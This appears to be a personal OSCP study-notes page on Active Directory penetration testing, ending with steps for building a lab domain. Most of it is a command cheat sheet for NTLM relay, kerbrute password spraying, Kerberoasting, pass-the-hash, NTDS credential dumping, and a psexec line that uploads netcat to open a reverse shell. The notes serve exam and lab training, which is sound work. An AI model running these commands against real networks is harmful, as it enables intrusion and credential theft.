### :open_file_folder: Learning resources

https://www.hackingarticles.in/active-directory-pentesting-lab-setup/

https://twitter.com/hackthebox_eu/status/1529122562038456320?cxt=HHwWgICzhcu3xLgqAAAA

AD mindmap <br>
https://github.com/Orange-Cyberdefense/arsenal/blob/master/mindmap/pentest_ad_dark.svg

https://tryhackme.com/room/breachingad

Security identifier (SID) and Relative identifier (RID) <br>
https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers

AD test environment

https://github.com/Orange-Cyberdefense/GOAD

### :open_file_folder: [Allowed Tools](https://help.offensive-security.com/hc/en-us/articles/4412170923924#h_01FP8CCWDT0GX03RCE6RGYRZT4)

Be sure to check the restrictions on the use of tools before taking the exam.

- BloodHound
- SharpHound
- PowerShell Empire
- Covenant 
- Powerview
- Rubeus
- evil-winrm
- Responder (Poisoning and Spoofing is not allowed in the labs or on the exam)
- Crackmapexec
- Mimikatz

### :open_file_folder: Flow (WIP)

![AD drawio](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/AD.drawio.png)

### :open_file_folder: Commands

service scan, domain information, check for ```null sessions```, shares 

[enum4linux-ng](https://github.com/cddmp/enum4linux-ng)

```shell
enum4linux-ng -A <target ip> 
# all simple enumeration
```

Enumerating Users

add target domain /etc/hosts, if needed

```shell
127.0.0.1 localhost
<target domain ip> <Active Directory Domain>
```

NTLM Relay

```shell
# listening
python3 ntlmrelayx.py --remove-mic --escalate-user hack -t ldap://<attacker ip> -smb2support  
# 
python3 PetitPotam.py -d <domain> -u <user> -p <password> <attacker ip> <target ip>
```

Dumping LDAP

```shell
ldapsearch -LLL -x -H ldap://<target ip> -b '' -s base '(objectclass=*)'
# with credential, e.g., domain = test.local
ldapsearch -H ldap://<target ip> -x -W -D "<user>@test.local" -b "dc=<test>,dc=<local>"
# check the dump file's content, e.g., domain_users.json, the value of key "info"
ldapdomaindump -u '<domain>\<username>' -p '<password>' <HOSTNAME or target ip>
```

search smb vulnerability

```shell
nmap --script "safe or smb-enum-*" -p 445 <target ip>
```

Read gMSA password (```ReadGMSAPassword``` and ```AllowedToDelegate``` rights) (HTB BOX:Intelligence)

```
git clone https://github.com/micahvandeusen/gMSADumper.git
python3 gMSADumper.py -u <user> -p <password> -d <domain>
```

enumerate domain usernames

```shell
# 1
kerbrute_linux_amd64 -t <threads> --dc <domain controller> -d <domain> userenum  ~/Documents/userlist.txt
# 2 valid users
kerbrute userenum -d <domain> --dc <domain controller> ~/Documents/userlist.txt | grep "USERNAME" | cut -f1 -d"@" | cut -f4 -d":" | tr -d "[:blank:]" > /tmp/users.txt
# bruteuser
./kerbrute_linux_amd64 -t <threads> --dc <domain controller> -d <domain> bruteuser ~/Documents/rockyou.txt <user>
# passwordspray
./kerbrute_linux_amd64 -t <threads> --dc <domain controller> -d <domain> passwordspray <userlist> '<password>'
```

[GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)

```shell
python3 GetNPUsers.py <domain>/ -dc-ip <target ip> -usersfile <userlist> -format hashcat -outputfile <hashes>
python3 GetNPUsers.py <domain>/ -dc-ip <target ip> -format hashcat -outputfile <hashes>
```

change password (STATUS_PASSWORD_MUST_CHANGE)

```shell
smbpasswd -U <user_name> -r <target ip>
```

mount Windows shares

```shell
mount -t cifs //<target ip>/<folder> <attacker folder> -o username=<user>
```

### :open_file_folder: BloodHound

collecting data in Windows

```cmd
.\SharpHound.exe -c all --zipfilename ad_data
```

collecting data in Linux

```shell
python3 bloodhound.py -ns <nameserver ip> -d <domain> -c all -u <username> -p <password>
```

### :open_file_folder: PowerView

```powershell
# Groups
Get-NetGroup
```

```powershell
# Computers
Get-NetComputer -fulldata
# select
Get-NetComputer -fulldata | select operatingsystem
```

```powershell
# Users
Get-NetUser
# password last set
Get-NetUser -properties name, pwdlastset, logoncount, badpwdcount
```

### :open_file_folder: [CrackMapExec](https://mpgn.gitbook.io/crackmapexec/)

[Pwn3d!](https://mpgn.gitbook.io/crackmapexec/news-2022/major-release-for-crackmapexec#ldap-getting-the-pwn3d-flag-lets-go-deeper-with-ldap):domain admin flag

```shell
# brute forcing, server may block brute-force attack
sudo crackmapexec <protocol> <target ip> -u <user_list.txt> -p <password_list.txt>
# check password policy
sudo crackmapexec <protocol> <target ip> --pass-pol
# using existing credentials and users to find more credentials 
sudo crackmapexec <protocol> <target ip> -u /tmp/users.txt -p <password> --continue-on-success
# using low privilege user to enumerate more users
sudo crackmapexec <protocol> <target ip> -u <username> -p <password> --users
# using low privilege user to enumerate more groups
sudo crackmapexec <protocol> <target ip> -u <username> -p <password> --groups
# enumerate logged users on multiple servers
sudo crackmapexec <protocol> <target ip(s)> -u <username> -p <password> --loggedon-users
# enumerate shares on multiple servers
sudo crackmapexec <protocol> <target ip(s)> -u <username> -p <password> --shares
# list readable share files
sudo crackmapexec <protocol> <target ip(s)> -u <username> -p <password> -M spider_plus
# bruteforcing the RID
sudo crackmapexec <protocol> <target ip(s)> -u <username> -p <password> --rid-brute
# using NTLM hash (NTDS.dit) to check credentials
# e.g., Administrator:500:aad3b435b51404eeaad3b435b51404ee:a8a3b1fee7718533175de682804c417a:::
sudo crackmapexec smb <target ip(s)> -u <username> -H 'LM:NT'
# sudo crackmapexec smb test.local -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:a8a3b1fee7718533175de682804c417a'
sudo crackmapexec smb <target ip(s)> -u <username> -H 'NTHASH'
# sudo crackmapexec smb test.local -u Administrator -H 'a8a3b1fee7718533175de682804c417a'

# anonymous access
sudo crackmapexec smb <target ip> -u 'anonymous' -p '' --shares   
```

### :open_file_folder: [dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11))

[![Windows](https://badgen.net/badge/icon/windows?icon=windows&label)](https://microsoft.com/windows/)

[userAccountControl](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties)

[OID](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/4e638665-f466-4597-93c4-12f2ebfabab5?redirectedfrom=MSDN): LDAP Matching Rules

```powershell
# http://www.selfadsi.org/ads-attributes/user-userAccountControl.htm
# userAccountControl:<LDAP_MATCHING_RULE OID>:=<flags (sum) value>
# inactive accounts (ACCOUNTDISABLE=2)
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=2)"
```

### :open_file_folder: rpcclient

If ```null session``` is enabled on the network. Server may have null session vulnerability but unable to enumerate because of permission settings.

```shell
# null session
 rpcclient -U "" -N <target ip>
# -U username
# -N no password

# If you cannot enumerate, you must provide a valid credentail 
rpcclient -U <username> --password <password> <target ip> 

rpcclient $> querydominfo
# Domain info
rpcclient $> lookupdomain <domain_name>
# Domain info (include SID)
rpcclient $> querydispinfo
# Query display info (include RID)
rpcclient $> queryuser <RID> or <username> 
# Enumerate domain users (include RID)
rpcclient $> enumdomusers
# Enumerate domain groups
rpcclient $> enumdomgroups
# Enumerate alias groups
rpcclient $> enumalsgroups <builtin> or <domain> 
# Enumerate domains
rpcclient $> enumdomains
# Enumerate privileges
rpcclient $> enumprivs
# Get domain password info
rpcclient $> getdompwinfo
# Get user domain password info
rpcclient $> getusrdompwinfo <RID> 
# Enumerate the LSA SIDs
rpcclient $> lsaenumsid
# Lookup SID
rpcclient $> lookupsids <SID>
# Enumerate SIDs privileges
rpcclient $> lsaenumacctrights <SID>
# Enumerate shares
rpcclient $> netshareenum
# Enumerate all shares
rpcclient $> netshareenumall
# Details of share
rpcclient $> netsharegetinfo <sharename>
# Lookup username to RID
rpcclient $> samlookupnames domain <username>
# Lookup RID to username
rpcclient $> samlookuprids domain <RID>
# Query LSA policy
rpcclient $> lsaquery
# Create a new user
rpcclient $> createdomuser <username>
# Set new user's password <level>:USER_INFORMATION_CLASS number e.g., 24 (https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN)
rpcclient $> setuserinfo2 <username> <level> <password>
# installed and share printers
rpcclient $> enumprinters
```

### :open_file_folder: [Psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)

[Microsoft PsExec Tool](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) (```ADMIN$```)

get interactive shell on the Windows host (```ADMIN$``` or ```C$``` must be writeable)

```shell
psexec.py <domain>/<username>:'<password>'@<target ip>
# example
psexec.py punipunidenki.local/administrator:'f!wef23424;'@192.168.9.100 "-e cmd.exe 192.168.9.123 4444" -c ~/Documents/nc.exe
# -c pathname copy the filename for later execution, arguments are passed in the command option
```

### :open_file_folder: [Krbrelayx](https://github.com/dirkjanm/krbrelayx)

```shell
# add AD Integrated DNS records
python3 dnstool.py -u '<domain>\<user>' -p <password> <target ip> -a add -r <TARGETRECORD> -d <attacker ip> -t A
# get information in a few minutes
responder -I tun0
```

### :open_file_folder: Extracting

[secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py): extracting the password hash from ntds.dit

```shell
# 1
secretsdump.py -ntds /tmp/ntds.dit -system /tmp/SYSTEM local -outputfile /tmp/ADHashes.txt
# 2
impacket-secretsdump <username>:<password>@<domain or IP> -dc-ip <DOMAINCONTROL IP>
```

[getTGT.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py): get a Kerberos ticket and use it to access other services

```shell
# If in VirtualBox, disabling time synchronization between the virtual machine and the host.
sudo service virtualbox-guest-utils stop
# synchronize with server time
sudo ntpdate <target ip>
#
getTGT.py -hashes '<LMHASH:NTHASH>' <domain>/<user>
# Kerberos credentials cache
export KRB5CCNAME=<username>@<domain>.ccache
export KRB5CCNAME=<TGT_ccache_file>
# showing Kerberos credentials cache
klist
# login method1
python3 psexec.py -k -no-pass <target>
# login method2
wmiexec.py -k -no-pass <target>
```

[reg.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/reg.py): remote registry manipulation tool through the ```MS-RRP``` [(Windows Remote Registry Protocol)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/0fa3191d-bb79-490a-81bd-54c2601b7a78)

```shell
reg.py <domain>/<valid username with domain> -hashes '<LMHASH:NTHASH>' query -keyName <Registry Root Keys>
# Registry Root Keys: HKCR, HKCU, HKLM, HKU, HKCC
```

### :open_file_folder: GGP

Groups.xml

```
gpp-decrypt <Groups.xml cpassword strings>
```

### :open_file_folder: Kerberoasting

service logon account with SPN services

```
# valid domain credentials
python3 GetUserSPNs.py <domain>/<username>:<password> -dc-ip <target ip> 
```

```
python3 GetUserSPNs.py <domain>/<username>:<password> -dc-ip <target ip> -request -output <hashfile>
```

```
hashcat -a 0 -m 13100 <hashfile> ~/Documents/rockyou.txt       
```

### :open_file_folder: Test Environment

First we have to set up AD server, we can use the evaluation edition of windows sever. I chose to download the VHD version.

```
https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2022#Get-started
```

Use the previously downloaded VHD file to create a virtual machine.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step1.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step2.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step3.png)

After creating the virtual machine, switch the network to bridged.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step4.png)


Install the AD service.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step5.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step6.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step7.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step8.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step9.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step10.png)


Create domain control.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step11.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step12.png)

Add a new forest.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step13.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step14.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step15.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step16.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step17.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step18.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step19.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step20.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step21.png)

Create a user account.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step22.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step23.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step24.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step25.png)

The AD server and user account are ready. Next we create a clinet pc environment. We can download the ISO file and use it to create virtual machine.

```
https://www.microsoft.com/en-us/software-download/windows11
```

Remembering to switch client virtual machine's network to bridged too. You can also test whether the connection between client to AD server is work.

Setting up DNS server in our client pc. The DNS server is the same as the AD server.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/client_step1.png)

Now we can join the domain. (If you get an error when you join, try disabling IPv6.)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/client_step2.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/client_step3.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/client_step4.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/client_step5.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/client_step6.png)

Disabling IPv6.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/client_step7.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/client_step8.png)
